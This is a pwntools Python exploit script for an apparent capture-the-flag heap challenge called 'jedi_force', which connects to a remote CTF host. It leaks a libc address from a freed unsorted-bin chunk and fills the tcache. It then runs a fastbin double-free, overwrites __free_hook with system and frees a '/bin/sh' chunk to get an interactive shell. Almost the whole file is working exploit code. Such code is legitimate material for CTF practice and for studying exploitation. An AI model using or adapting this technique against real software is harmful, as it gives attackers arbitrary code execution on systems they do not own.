#!/usr/bin/env python3

from pwn import *

the_binary = "./jedi_force"
context.binary = the_binary
elf = context.binary
libc = ELF("libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("warzone.hackrocks.com", 7771)
else:
    io = process(["./ld-2.31.so", the_binary])

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def choice(num):
    io.sendlineafter(b"choose:", str(num).encode())

def alloc(idx, data, sz=None):
    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz

    choice(1)
    io.sendlineafter(b"number:\n", str(idx).encode())
    io.sendlineafter(b"age: \n", str(sz).encode())
    io.sendafter(b"name:\n", data)

def free(idx):
    choice(3)
    io.sendlineafter(b"cancel:\n", str(idx).encode())

def show(idx):
    choice(2)
    io.sendlineafter(b"number: \n", str(idx).encode())

# libc leak from pointers in freed unsortedbin chunk
alloc(0, b"A", sz=0x1000)
alloc(1, b"B", sz=0x10)
free(0)
show(0)
io.recvuntil(b"jedi data: ")
libc_leak = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ebbe0
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)
free(1)

sz = 0x28
# Create chunks that will end up in the tcache.
for i in range(7):
    alloc(i, chr(0x30+i).encode()*sz, sz=sz)
# Create chunks that will end up in the fastbin.
alloc(7, b"C", sz=sz)
alloc(8, b"D", sz=sz)

# Populate the tcache bin.
for i in range(7):
    free(6-i)

# Perform double-free on the chunks that will end up in the fastbin.
free(7)
free(8)
free(7)

# Empty the tcache so we can allocate from the fastbin.
for i in range(7):
    alloc(i, chr(0x30+i).encode()*sz, sz=sz)

# Overwrite the fd pointer of one of the fastbin chunks. This also promotes
# these chunks into the tcache, including the corrupted fd pointer.
alloc(7, p64(libc.sym.__free_hook), sz=sz)
alloc(8, b"/bin/sh\x00", sz=sz)
alloc(9, b"E", sz=sz)
alloc(10, p64(libc.sym.system), sz=sz)

# Trigger __free_hook("/bin/sh\x00").
free(8)

io.interactive()
